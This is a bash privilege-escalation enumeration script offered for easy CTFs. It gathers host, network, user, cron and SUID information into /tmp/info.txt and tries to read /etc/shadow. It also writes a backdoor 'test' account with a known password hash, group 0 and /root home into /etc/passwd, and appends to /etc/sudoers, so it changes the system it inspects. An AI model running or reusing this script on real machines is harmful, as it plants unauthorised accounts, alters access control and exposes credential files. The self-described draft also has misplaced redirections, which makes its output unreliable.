#! /bin/bash

# PETS v1.0 PrivEsqTerribleScript
# a terrible script for easy CTFs inspired by linpeas
# draft, may contain typos

hostname -f > /tmp/info.txt
ip a >> /tmp/info.txt
uname -a >> /tmp/info.txt
echo '------------------------------------------------------------------------------' >> /tmp/info.txt
echo 'LISTEN PORTS' >> /tmp/info.txt
netstat -lntu >> /tmp/info.txt
echo '------------------------------------------------------------------------------' >> /tmp/info.txt
echo 'PIVOTING?' >> /tmp/info.txt
ip neighbour show >> /tmp/info.txt
echo '------------------------------------------------------------------------------' >> /tmp/info.txt
echo 'SHADOW?' >> /tmp/info.txt
cat /etc/shadow || echo 'can not cat shadow file' >> /tmp/info.txt
echo '------------------------------------------------------------------------------' >> /tmp/info.txt
echo 'WRITE PASSWD?' >> /tmp/info.txt
echo 'test:$6$52450745$k5ka2p8bFuSmoVT1tzOyyuaREkkKBcCNqoDKzYiJL9RaE8yMnPgh2XzzF0NDrUhgrcLwg78xs1w5pJiypEdFX/:5000:0::/root:/bin/bash' >> /etc/passwd && echo 'yup – password = hashcat user = test' || echo 'nope' >> /tmp/info.txt
echo '------------------------------------------------------------------------------' >> /tmp/info.txt
echo 'WRITE SUDOERS FILE?' >> /tmp/info.txt
echo '#test' >> /etc/sudoers && echo 'yup' >> /tmp/info.txt || echo 'nope' >> /tmp/info.txt
echo '------------------------------------------------------------------------------' >> /tmp/info.txt
echo 'LIST OF USERS' >> /tmp/info.txt
awk -F: '$3 >= 1000 && $3 <= 60000' /etc/passwd | grep -v nobody >> /tmp/info.txt
echo '------------------------------------------------------------------------------' >> /tmp/info.txt
echo 'ROOT CRON SCRIPTS?' >> /tmp/info.txt
grep '^root' /etc/crontab | grep -E '\.sh$|\.py$' >> /tmp/info.txt || echo 'no bash or python as root'>> /tmp/info.txt
echo '------------------------------------------------------------------------------' >> /tmp/info.txt
echo 'SUID BITS' >> /tmp/info.txt
find /usr /bin -type f -perm -4000 2>/dev/null | grep -v -E '(sudo|passwd|su|ping|ping6|newgrp|chsh|chfn|mount|umount|gpasswd|polkit-agent-helper-1)'  >> /tmp/info.txt
echo '------------------------------------------------------------------------------' >> /tmp/info.txt
echo 'CURRENT USER' >> /tmp/info.txt
id >> /tmp/info.txt
echo 'ALL DONE. GOOD LUCK'
echo ' '
sleep 5
clear
cat /tmp/info.txt
